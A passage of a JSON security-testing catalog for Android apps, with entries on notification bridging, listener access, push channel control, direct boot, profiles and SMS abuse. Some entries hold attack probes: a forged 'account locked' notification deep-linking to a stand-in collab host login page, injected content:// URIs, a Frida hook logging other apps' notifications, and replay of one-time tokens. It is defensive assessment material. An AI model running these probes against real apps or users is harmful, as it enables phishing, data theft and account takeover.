+  },
+  {
+   "id": "D24-024",
+   "domain": "D24",
+   "title": "Notification content bridged to Wear, Auto and desktop companions, and retained there after dismissal",
+   "severity": "medium",
+   "severity_floor": "low",
+   "severity_note": "Medium when the bridged content is an OTP or a message body; Low otherwise",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-10 / AM-11 — the companion on a desk, a wrist, a car or a shared desktop",
+   "attacker_ids": [
+    "AM-10",
+    "AM-11"
+   ],
+   "applies_to": "Apps that post sensitive channels without `setLocalOnly(true)`; apps with `WearableExtender` / `CarExtender` content",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0037; MASTG-TEST-0315; D20-033 (history on the handset), D04-071 (widget and lock-screen surfaces), D15-015 (companion endpoints)",
+   "record": "`logs/D24-024.txt` (dumpsys flags: `LOCAL_ONLY` present or absent per channel); `screenshots/D24-024-1.png` (the companion)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0315"
+    ],
+    "maswe": [
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D04-071",
+    "D13-048",
+    "D15-015",
+    "D20-033",
+    "D24-012"
+   ],
+   "domain_refs": [
+    "D04",
+    "D13",
+    "D15",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "no companion can be paired in the lab and every sensitive channel sets `setLocalOnly(true)` (grep shows it on each `notify()` path) — write `n/a — D24-024: sensitive channels local-only (file:line); no companion in lab` and keep the row `blocked` rather than n/a when the first clause is false.",
+   "test": "By default a notification is bridged to every paired companion and to phone-mirroring\ndesktops, where it is rendered on a surface with its own lock state and its own retention. The handset's\n`VISIBILITY_PRIVATE` does not travel with it. An OTP, a one-time link or a message body on a watch face\nis readable by whoever can see the wrist.",
+   "how": "```bash\ngrep -rnE 'setLocalOnly\\(|WearableExtender|CarExtender|setBridgeTag|setDismissalId' \"$DEC/jadx/sources\" | head\n# pair a Wear emulator or a companion you own; trigger the OTP / message flow; then:\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -A14 \"pkg=$PKG\" | grep -E 'flags=|LOCAL_ONLY|text=' | tee \"$E/logs/D24-024.txt\"\n```",
+   "proof": "The sensitive text rendered on the companion (screenshot or the companion's own dumpsys) and\nthe `flags=` line showing no `LOCAL_ONLY` on that channel.",
+   "escalation": "→ D13-048 when it is the OTP; → D24-012 for the content class; → D20-033 for history\non the handset.",
+   "ruled_out_when": "Sensitive channels set `setLocalOnly(true)` (file:line, `LOCAL_ONLY` in dumpsys)\nand the companion trial shows nothing for that channel."
+  },
+  {
+   "id": "D24-025",
+   "domain": "D24",
+   "title": "`MessagingStyle` persons, `content://` icons and custom `RemoteViews` built from untrusted input — SystemUI and every listener as the reader",
+   "severity": "medium",
+   "severity_floor": "low",
+   "severity_note": "Medium when a listener gains a read grant on the app's private URI; Low / P5 for the crash half",
+   "vrt": "`application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) for the crash; rated on the D07 disclosure when the URI grant lands",
+   "vrt_priority": "P5",
+   "vrt_best": "P5",
+   "attacker": "AM-05 (a message whose avatar or media field reaches the builder); AM-03 via D05-017 / D24-019; AM-04 for the listener that receives the grant",
+   "attacker_ids": [
+    "AM-03",
+    "AM-04",
+    "AM-05"
+   ],
+   "applies_to": "Notification builders that take an icon, person avatar, image or layout id from a message, push or Intent field",
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
+   "maps_to": "MASWE-0050; MASWE-0032; CWE-20; D05-017, D20-031 (the listener PoC), D07 domain (the provider the URI points at)",
+   "record": "`logs/D24-025.txt`; `pocs/F-NNN/` when the grant is proved",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0032",
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-20"
+    ],
+    "attack": [],
+    "vrt": [
+     "application_level_denial_of_service_dos.app_crash.malformed_android_intents"
+    ]
+   },
+   "xrefs": [
+    "D05-017",
+    "D20-031",
+    "D24-004",
+    "D24-015"
+   ],
+   "domain_refs": [
+    "D05",
+    "D07",
+    "D16",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "The system grants read access on every `content://` URI inside a notification to SystemUI\n**and to the enabled listeners**, so that they can render it. A builder that accepts a sender-chosen\nURI for an avatar or picture therefore hands the app's own provider content (a `content://<pkg>.\nfileprovider/...` path chosen by the sender) to any granted listener. The weaker half: a bad layout id\nor a huge bitmap crashes SystemUI or the app — P5 unless persistent.",
+   "how": "```bash\ngrep -rnE 'MessagingStyle|Person\\.Builder|createWithContentUri\\(|setLargeIcon\\(|RemoteViews\\(|setCustomContentView\\(' \"$DEC/jadx/sources\" | head\n# feed the sender-controlled field (avatar URL, image URL, sticker id) with  content://$PKG.fileprovider/<path from D07 inventory>  via a message from account B or the D24-004 harness\n# then from the D20-031 PoC listener, read sbn.getNotification().extras and open the URI with the listener's ContentResolver\n```",
+   "proof": "The listener's log reading bytes from the app's private URI that the notification carried,\nwith the message or payload that chose the URI; or the reproducible crash with the input (P5 — note it,\ndo not file it alone).",
+   "escalation": "→ D07 for what the provider exposes; → D20-031 for the listener PoC; → D16 if the\nimage decode is the sink (D24-015).",
+   "ruled_out_when": "Icons and images come only from the app's own cache or resource ids (file:line),\nand a sender-supplied `content://` value is rejected or re-fetched over HTTPS (trace shows the URI\nnever reaches the builder)."
+  },
+  {
+   "id": "D24-026",
+   "domain": "D24",
+   "title": "Channel and importance chosen by the payload — the push-driven half of D20-030",
+   "severity": "medium",
+   "severity_floor": "low",
+   "severity_note": "Medium; Low when the selectable channels are all private",
+   "vrt": "inherits D20-030 (lock-screen visibility and channel override)",
+   "vrt_priority": "inherit:D20-030",
+   "vrt_best": "inherit:D20-030",
+   "attacker": "AM-05 / AM-01 for the sender; AM-10 for the lock-screen reader",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05",
+    "AM-10"
+   ],
+   "applies_to": "Handlers that honour a payload channel id (`android_channel_id`, `gcm.n.android_channel_id`, a vendor `channel` key) or build the channel from payload importance",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0037; MASTG-TEST-0315; D20-030 (owner of the visibility model)",
+   "record": "`logs/D24-026.txt` (the channel table from dumpsys and the self-sent message's channel)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0315"
+    ],
+    "maswe": [
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D20-030",
+    "D24-012"
+   ],
+   "domain_refs": [
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'android_channel_id|setChannelId\\(' \"$DEC/jadx/sources\" | wc -l` = 0 and the handler uses one constant channel — write `n/a — D24-026: channel fixed in code (file:line)`.",
+   "test": "D20-030 settles whether each channel is visible on the keyguard. This item asks who picks the\nchannel: if the sender does, a sensitive message can be posted on the public, high-importance channel\nthe user keeps for promotions, with full lock-screen content and heads-up.",
+   "how": "```bash\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -oE 'NotificationChannel\\{[^}]+\\}' | grep -oE 'mId=[^,]+|mImportance=[0-9]+|mLockscreenVisibility=-?[0-9]+' | paste - - - | tee \"$E/logs/D24-026.txt\"\ngrep -rnE 'android_channel_id|getChannelId\\(|setChannelId\\(' \"$DEC/jadx/sources\" | head\n# self-send the OTP / message-class payload with  --es 'gcm.n.android_channel_id' '<public channel id>'  (or the handler's own channel key) and read the posted entry's channel\n```",
+   "proof": "The self-sent sensitive-class content posted on a `mLockscreenVisibility=1` channel chosen\nby the payload, while the app's default channel for that content is private.",
+   "escalation": "→ D20-030 for the rating; → D24-012 for the content class.",
+   "ruled_out_when": "The handler maps content type to a fixed channel and ignores payload channel ids\n(file:line; the canary with a foreign channel id posts on the default channel), or every selectable\nchannel is private with a public version."
+  },
+  {
+   "id": "D24-027",
+   "domain": "D24",
+   "title": "Notification posted under the app's identity from an untrusted local trigger — the PoC standard for D05-017",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "Medium; High when the tap target or text leads to a credential prompt",
+   "vrt": "as D05-017",
+   "vrt_priority": "inherit:D05-017",
+   "vrt_best": "inherit:D05-017",
+   "attacker": "AM-03",
+   "attacker_ids": [
+    "AM-03"
+   ],
+   "applies_to": "Any exported receiver, activity or deep link whose extras reach `notify()`. D05-017 owns the receiver variant; this item owns the activity and deep-link variants and the evidence standard for all three.",
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
+   "maps_to": "MASWE-0018; MASTG-TEST-0366; D05-017; D09 (deep-link trigger); `docs/04-poc-and-evidence-standard.md`",
+   "record": "`logs/D24-027.txt`; `pocs/F-NNN/` (probe-app manifest, the rendered screenshot, the tap target)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0366"
+    ],
+    "maswe": [
+     "MASWE-0018"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D05-017",
+    "D24-013",
+    "D24-014"
+   ],
+   "domain_refs": [
+    "D04",
+    "D05",
+    "D09"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "A forged notification is only a finding when it is (a) rendered under the vendor's icon,\n(b) triggered from a principal with no permissions or from a link, and (c) leads somewhere — a deep link\nto a credential prompt or a WebView. Evidence standard: the probe app's `requestedPermissions=[]` line,\nthe drawer screenshot with canary text, the tap and its destination, and the same payload refused by\nthe hardened path as the negative control.",
+   "how": "```bash\ngrep -rnE 'NotificationManagerCompat\\.from\\(|\\.notify\\(' \"$DEC/jadx/sources\" | head -20\n# map each notify() back to its trigger: an exported activity's getIntent() extras (D04), a deep-link parameter (D09), or a receiver extra (D05-017)\n# probe app: fire the trigger with  --es 'title' 'Your account is locked' --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/login'\n```",
+   "proof": "As D05-017, plus the tap destination and the collab-host hit that proves the deep link.",
+   "escalation": "→ D24-013 / D24-014 for where the tap lands; → D04 for the redress argument.",
+   "ruled_out_when": "As D05-017: the content comes from an authenticated server fetch keyed on a\nserver-issued id and the extras are only a cache key — show the fetch."
+  },
+  {
+   "id": "D24-028",
+   "domain": "D24",
+   "title": "The app as a `NotificationListenerService` consumer — where other apps' notifications go",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High when other apps' OTPs or message bodies leave the device; Medium for on-device retention beyond the stated purpose",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "n/a — the app itself is the actor (privacy class); AM-09 for the backend that receives the content",
+   "attacker_ids": [
+    "AM-09"
+   ],
+   "applies_to": "Apps declaring a `NotificationListenerService` (\"OTP autofill\", \"message sync\", \"smart replies\", wearable bridges)",
+   "requires": "device, frida",
+   "requires_tags": [
+    "device",
+    "frida"
+   ],
+   "maps_to": "MASWE-0069; MASWE-0073; MASTG-TEST-0319; ATT&CK T1517; D20-031 (building the PoC listener), D20-032 and D22-047 (OTP redaction and its route-arounds), D13-050",
+   "record": "`logs/D24-028.txt` (hook output + the proxy line); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0319"
+    ],
+    "maswe": [
+     "MASWE-0069",
+     "MASWE-0073"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [
+     "T1517"
+    ],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D13-050",
+    "D20-031",
+    "D20-032",
+    "D22-047"
+   ],
+   "domain_refs": [
+    "D13",
+    "D20",
+    "D22"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'extends NotificationListenerService' \"$DEC/jadx/sources\" | wc -l` = 0 and the manifest declares no `BIND_NOTIFICATION_LISTENER_SERVICE` service — write `n/a — D24-028: the app is not a notification listener`.",
+   "test": "The listener grant reads every app's notifications. Read `onNotificationPosted` to its sinks:\ndoes it filter by package, what fields does it keep, and does any of it reach the network or a database?\nA canary notification from another package that appears in the proxy is the finding; one that is stored\nin the app's own DB is the retention variant.",
+   "how": "```bash\ngrep -rnE 'extends NotificationListenerService|onNotificationPosted\\(' \"$DEC/jadx/sources\" | head\ncat > \"$E/frida/d24-028.js\" <<'JS'\nJava.perform(function () {\n  var L = Java.use('android.service.notification.NotificationListenerService');\n  L.onNotificationPosted.overload('android.service.notification.StatusBarNotification').implementation = function (sbn) {\n    console.log('[D24-028] ' + sbn.getPackageName() + ' ' + sbn.getNotification().extras.toString()); return this.onNotificationPosted(sbn);\n  };\n});\nJS\nfrida -D \"$SERIAL\" -n \"$PKG\" -l \"$E/frida/d24-028.js\" -q -t 300 | tee \"$E/logs/D24-028.txt\" &\nadb -s \"$SERIAL\" shell \"cmd notification post -t 'D24-028' 'd24tag' 'canary 7731 from another package'\"   # or any second app you own\n```",
+   "proof": "The hook shows the foreign package's text entering the app, and the proxy or a DB dump shows\nit leaving the device or persisted.",
+   "escalation": "→ D20-032 / D22-047 when the app obtained a companion-device association to keep\nreading OTPs; → D20 data-collection declarations (MASWE-0073).",
+   "ruled_out_when": "The listener filters to a documented package allow-list (file:line) and the canary\nfrom another package appears neither in the proxy nor in any file under the app's data directory."
+  },
+  {
+   "id": "D24-029",
+   "domain": "D24",
+   "title": "Direct-boot-aware push handler running before first unlock — the push-triggered DE write or crash",
+   "severity": "medium",
+   "severity_floor": "medium",
+   "severity_note": "Medium",
+   "vrt": "rated on the consequence — a token or payload written to device-protected storage (D11-025) or an action taken before unlock",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-01 with a send path; AM-10 for the locked device whose DE storage is then readable",
+   "attacker_ids": [
+    "AM-01",
+    "AM-10"
+   ],
+   "applies_to": "Messaging services or receivers declared `android:directBootAware=\"true\"`",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0001; D11-025 (DE storage), D05-059 (the receiver attribute)",
+   "record": "`logs/D24-029.txt` (file listing of `/data/user_de/0/$PKG` before and after; logcat)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0001"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D05-059",
+    "D11-025",
+    "D24-004",
+    "D24-016"
+   ],
+   "domain_refs": [
+    "D05",
+    "D11"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -c 'directBootAware=\"true\"' \"$DEC/apktool/AndroidManifest.xml\"` = 0 — write `n/a — D24-029: no direct-boot-aware component`.",
+   "test": "A direct-boot-aware handler runs after reboot while credential-encrypted storage is still\nlocked. Two failure shapes: it writes the payload or the refreshed token into device-protected storage\n(readable without the PIN), or it fails open and performs the action with whatever state DE holds.",
+   "how": "```bash\ngrep -B2 -A4 'directBootAware=\"true\"' \"$DEC/apktool/AndroidManifest.xml\" | grep -E 'service|receiver'\ngrep -rnE 'createDeviceProtectedStorageContext\\(|isUserUnlocked\\(' \"$DEC/jadx/sources\" | head\nadb -s \"$SERIAL\" shell \"ls -laR /data/user_de/0/$PKG\" > \"$E/logs/D24-029-before.txt\"; adb -s \"$SERIAL\" reboot\n# do NOT unlock; wait for boot; deliver a push (the D24-004 root harness works on a userdebug AVD without unlock), then:\nadb -s \"$SERIAL\" shell \"ls -laR /data/user_de/0/$PKG\" > \"$E/logs/D24-029-after.txt\"; diff \"$E/logs/D24-029-before.txt\" \"$E/logs/D24-029-after.txt\" | tee \"$E/logs/D24-029.txt\"\nadb -s \"$SERIAL\" logcat -d | grep -E \"$PKG|AndroidRuntime\" | tail -40 >> \"$E/logs/D24-029.txt\"\n```",
+   "proof": "A new or grown file under `/data/user_de/0/$PKG/` containing the payload or token after a\npre-unlock delivery, or a crash trace naming the locked CE path.",
+   "escalation": "→ D11-025 for what DE storage then exposes; → D24-016 when the pre-unlock action is a\nbackend call.",
+   "ruled_out_when": "No component in the push path is direct-boot aware (manifest grep 0): the provider\nqueues the message until unlock, which the trial confirms (nothing in the diff, delivery after unlock)."
+  },
+  {
+   "id": "D24-030",
+   "domain": "D24",
+   "title": "Push delivered into the wrong profile — work profile and Private Space instances",
+   "severity": "medium",
+   "severity_floor": "low",
+   "severity_note": "Low; Medium when the private-space instance's content is shown while the space is locked",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-11 — whoever holds the unlocked handset with the private space locked",
+   "attacker_ids": [
+    "AM-11"
+   ],
+   "applies_to": "Apps installed in more than one profile on the same device (work profile, Private Space on Android 15+)",
+   "requires": "push, device, api>=35",
+   "requires_tags": [
+    "push",
+    "device",
+    "api>=35"
+   ],
+   "maps_to": "D22-049 (Private Space enumeration), D11-065 (profile separation), D23-014 (install-keyed state)",
+   "record": "`logs/D24-030.txt` (dumpsys per user id)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D11-065",
+    "D22-049",
+    "D23-014"
+   ],
+   "domain_refs": [
+    "D11",
+    "D22",
+    "D23"
+   ],
+   "has_code": true,
+   "skip_when": "device API < 35 and no work profile is provisioned (`adb -s \"$SERIAL\" shell pm list users` shows one user) — write `n/a — D24-030: single-profile device, API <35`.",
+   "test": "Each profile's instance registers its own token and its own account. The platform hides a\nlocked Private Space's notifications; the app can defeat that by keying registration on a device-wide\nidentifier (one token row for two instances) or by syncing notification state across profiles.",
+   "how": "```bash\nadb -s \"$SERIAL\" shell pm list users\nadb -s \"$SERIAL\" shell \"pm install --user <private-space user id> -r /data/local/tmp/base.apk\"   # or install from the Private Space UI\n# sign in as A in the main profile and B in the private space; lock the space; trigger B's event; then:\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -B2 -A8 \"pkg=$PKG\" | grep -E 'user=|text=' | tee \"$E/logs/D24-030.txt\"\n```",
+   "proof": "B's content posted under the main profile's user id, or shown while the Private Space is\nlocked.",
+   "escalation": "→ D11-065 for the storage boundary; → D23-014 when the same key multiplies an\nentitlement.",
+   "ruled_out_when": "Each instance registers its own token under its own account (two registration\nrequests with different tokens in the proxy) and the locked-space trial shows nothing in the main\nprofile's drawer."
+  },
+  {
+   "id": "D24-031",
+   "domain": "D24",
+   "title": "One-time tokens and privileged routes inside notification extras — read by a listener, replayed as the user",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "High; Critical when the token logs in or approves",
+   "vrt": "`broken_authentication_and_session_management.authentication_bypass` (P1) when the replayed route authenticates; `sensitive_data_exposure.sensitive_token_in_url.user_facing` (P4) otherwise",
+   "vrt_priority": "P1",
+   "vrt_best": "P1",
+   "attacker": "AM-04 — a notification listener the user granted",
+   "attacker_ids": [
+    "AM-04"
+   ],
+   "applies_to": "Apps whose notification deep links carry a signature, a magic-link token or an action token (`token=`, `sig=`, `auth=`, `otp=`) in `contentIntent` extras or in `EXTRA_TEXT`",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0037; MASTG-TEST-0315; D09-039 (notification-origin trust), D20-031 (the listener PoC), D13-056 (reset and magic-link tokens), D08-040 (harvesting the PendingIntent itself)",
+   "record": "`logs/D24-031.txt` (listener output with the token redacted; the replay trace); `pocs/F-NNN/`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0315"
+    ],
+    "maswe": [
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "broken_authentication_and_session_management.authentication_bypass",
+     "sensitive_data_exposure.sensitive_token_in_url.user_facing"
+    ]
+   },
+   "xrefs": [
+    "D08-040",
+    "D09-039",
+    "D13-056",
+    "D20-031",
+    "D24-002",
+    "D24-047"
+   ],
+   "domain_refs": [
+    "D08",
+    "D09",
+    "D13",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "The router trusts \"came from a notification\" (D09-039); the listener reads the notification.\nJoin them: a listener reads the deep link and its one-time parameter out of the extras and starts the\nroute itself, as the user, from its own process — no PendingIntent harvest needed.",
+   "how": "```bash\ngrep -E 'token=|sig=|auth=|otp=|code=' \"$E/logs/D24-002.txt\" | tee \"$E/logs/D24-031.txt\"\n# D20-031 PoC listener: log sbn.getNotification().extras and contentIntent; then from the listener's process:\n#   startActivity(Intent.parseUri('<the deep link with its token>', 0))   — before the user taps\n```",
+   "proof": "The route reached (authenticated screen, approval completed, login) from the listener's\nreplay, with the notification that carried the token.",
+   "escalation": "→ D13-056 when the token is a reset or magic link; → D08-040 when the mutable\n`PendingIntent` is the better acquisition; → D24-047 when it approves.",
+   "ruled_out_when": "Notification deep links carry only server-chosen ids and the privileged route\nre-authenticates in-app (D09-039 ruled out), and the D24-002 capture shows no token-like parameter."
+  },
+  {
+   "id": "D24-032",
+   "domain": "D24",
+   "title": "`SmsManager.send*` with an attacker-controlled destination or body reachable from an exported surface",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High — premium-rate toll fraud and SMS from the victim's number",
+   "vrt": "`broken_access_control.exposed_sensitive_android_intent` (varies); `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) for the billing framing",
+   "vrt_priority": "varies",
+   "vrt_best": "P4",
+   "attacker": "AM-03 (exported component) / AM-02 (deep link)",
+   "attacker_ids": [
+    "AM-02",
+    "AM-03"
+   ],
+   "applies_to": "Apps holding `SEND_SMS` or the default-SMS role whose send call takes destination or body from an Intent extra, a deep-link parameter or a WebView bridge",
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
+   "maps_to": "MASWE-0018; CWE-862; ATT&CK T1582 (SMS control), T1643 (generate traffic from victim); D03-031 (permission re-delegation), D03-058 (the role)",
+   "record": "`logs/D24-032.txt`; `pocs/F-NNN/` (probe-app log and the received message on your own test number)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0018"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862"
+    ],
+    "attack": [
+     "T1582",
+     "T1643"
+    ],
+    "vrt": [
+     "broken_access_control.exposed_sensitive_android_intent",
+     "sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse"
+    ]
+   },
+   "xrefs": [
+    "D03-031",
+    "D03-058",
+    "D13-052",
+    "D13-071"
+   ],
+   "domain_refs": [
+    "D03",
+    "D04",
+    "D09",
+    "D10",
+    "D13"
+   ],
+   "has_code": true,
+   "skip_when": "the manifest holds no `SEND_SMS` and no SMS role, and `grep -rlE 'SmsManager|sendTextMessage\\(' \"$DEC/jadx/sources\" | wc -l` = 0 — write `n/a — D24-032: no SMS send capability`.",
+   "test": "`sendTextMessage(dest, null, body, …)` fed from an exported surface lets a zero-permission\napp send SMS from the victim's number — to a premium short code, or as a phishing text to the victim's\ncontacts. The platform's own confirmation dialog applies only to premium destinations it recognises\nand only for non-default-SMS apps, so read the code path, do not assume the dialog.",
+   "how": "```bash\ngrep -rnE 'sendTextMessage\\(|sendMultipartTextMessage\\(|sendDataMessage\\(|SmsManager' \"$DEC/jadx/sources\" | head\n# trace each call's dest/body back to an Intent extra, a URI parameter or a bridge argument (D04 / D09 / D10 inventories)\n# probe app: fire the surface with  --es 'to' '<your own test number>' --es 'body' 'd24-032 canary'  — never a number you do not own\n```",
+   "proof": "The canary text arriving on your own test number, sent from the victim device, from a probe\nwith `requestedPermissions=[]` (or from a tapped link), with the surface that carried it.",
+   "escalation": "→ D13-052 / D13-071 when the SMS is the vendor's recovery or verification channel; →\nD03-031 for the re-delegation framing.",
+   "ruled_out_when": "Every send call takes its destination from app-owned state (file:line) and the\nprobe's attempt produces no message on the test number; or the app holds no SMS permission and no SMS\nrole (manifest)."
+  },
+  {
+   "id": "D24-033",
+   "domain": "D24",
+   "title": "Default-SMS-role components — exported by necessity, so the MMS/WAP parsers are the surface",
+   "severity": "critical",
+   "severity_floor": "medium",
+   "severity_note": "Medium standalone; High / Critical as the D16 delivery vector",
+   "vrt": "`application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) for a crash alone; rated on the D16 sink when the parser is a memory-safety bug",
+   "vrt_priority": "P5",
+   "vrt_best": "P5",
+   "attacker": "AM-01 — a message to the victim's number; AM-03 for the explicit-component variant",
+   "attacker_ids": [
+    "AM-01",
+    "AM-03"
+   ],
+   "applies_to": "Apps that register `SMS_DELIVER`, `WAP_PUSH_DELIVER` or `RESPOND_VIA_MESSAGE` (the default-SMS-role contract requires them exported). The role's read/write/erase consequences are D03-058.",
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
+   "maps_to": "MASWE-0050; MASWE-0044; D03-058 (owner of the role), D16-036 (0-click paths), D25-036 (vendor parser extraction)",
+   "record": "`logs/D24-033.txt`; `logs/D24-033-fuzz/` (inputs and crashes, hashed)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0044",
+     "MASWE-0050"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "application_level_denial_of_service_dos.app_crash.malformed_android_intents"
+    ]
+   },
+   "xrefs": [
+    "D03-058",
+    "D16-036",
+    "D24-005",
+    "D25-036"
+   ],
+   "domain_refs": [
+    "D03",
+    "D16",
+    "D25"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -cE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE' \"$DEC/apktool/AndroidManifest.xml\"` = 0 — write `n/a — D24-033: no default-SMS-role component`.",
+   "test": "These components must be exported; the finding is what the handler does with a hostile MMS\n(PDU, SMIL, attachment), a WAP push or a `RESPOND_VIA_MESSAGE` body. Native or third-party decoders\nbehind them are reachable by anyone who can text the number — the purest AM-01 on the device.",
+   "how": "```bash\ngrep -B2 -A8 -E 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE' \"$DEC/apktool/AndroidManifest.xml\" | grep -E 'name=|permission=|mimeType'\ngrep -rnE 'getMessagesFromIntent\\(|PduParser|SmilHelper|application/vnd\\.wap|GenericPdu' \"$DEC/jadx/sources\" | head\n# explicit-component delivery of one malformed MMS part (lab device, own numbers) and the logcat tail; route a reproducible crash to D16 with the entry point\n```",
+   "proof": "A reproducible crash or decoder fault from a received object, with the entry point and the\ninput hash — filed through D16, not as a P5 crash.",
+   "escalation": "→ D16-036 (the zero-click argument), → D25-036 for a vendor parser; → D03-058 for the\nprovider write/erase consequences of the role.",
+   "ruled_out_when": "The handler stores the PDU bytes and renders through platform decoders only\n(file:line), and a bounded fuzz of the parts (count printed, D24-005) produces no fault."
+  },
+  {
+   "id": "D24-034",
+   "domain": "D24",
+   "title": "SMS read scope and retention beyond the OTP — `content://sms` queries and inbox sync to the backend",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High (privacy) when unrelated messages leave the device; Medium for over-broad local reads",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies)",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "n/a — the app is the actor (privacy class); AM-09 for the backend that receives the inbox",
+   "attacker_ids": [
+    "AM-09"
+   ],
+   "applies_to": "Apps holding `READ_SMS` / `RECEIVE_SMS` or the SMS role (D13-050 covers the posture question: why not SMS Retriever?)",
+   "requires": "device, frida",
+   "requires_tags": [
+    "device",
+    "frida"
+   ],
+   "maps_to": "MASWE-0069; MASWE-0073; MASTG-TEST-0319; ATT&CK T1636.004; D13-050, D13-048",
+   "record": "`logs/D24-034.txt` (hook output: every SMS URI queried, with the selection); `requests/E-NNN.http` (the sync call)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TEST-0319"
+    ],
+    "maswe": [
+     "MASWE-0069",
+     "MASWE-0073"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [
+     "T1636.004"
+    ],
+    "vrt": [
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D13-048",
+    "D13-050"
+   ],
+   "domain_refs": [
+    "D13",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "the manifest holds no `READ_SMS`/`RECEIVE_SMS` and no SMS role, and `grep -rlE 'content://sms|Telephony\\.Sms' \"$DEC/jadx/sources\" | wc -l` = 0 — write `n/a — D24-034: no SMS read capability (SMS Retriever only, D13-050)`.",
+   "test": "An OTP reader needs one message matching one pattern for one minute. Hook `ContentResolver\n.query` for `content://sms*` URIs and read the selection: an unbounded inbox read, a periodic sync, or a\nbody upload to the backend is the finding, independent of the OTP use that justified the permission.",
